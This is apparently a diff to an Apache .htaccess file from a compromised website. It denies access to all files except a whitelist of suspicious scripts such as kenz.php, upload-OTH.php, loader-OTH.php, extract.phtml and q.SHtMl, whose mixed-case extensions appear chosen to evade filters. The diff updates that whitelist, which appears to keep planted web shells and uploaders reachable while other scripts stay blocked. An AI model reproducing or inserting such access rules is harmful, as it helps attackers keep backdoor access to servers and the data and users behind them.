@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(kenz-OTH.php|zhyper-OTH.php||loader-OTH.php|zhyperflow-OTH.php|error-OTH.php|upload-OTH.php|load-OTH.php|kongkek25-OTH.ShTMl)$">
+<FilesMatch "^(kenz.php|zhyper-OTH.php||loader-OTH.php|zhyperflow-OTH.php|error-OTH.php|upload-OTH.php|extract.phtml|q.SHtMl)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
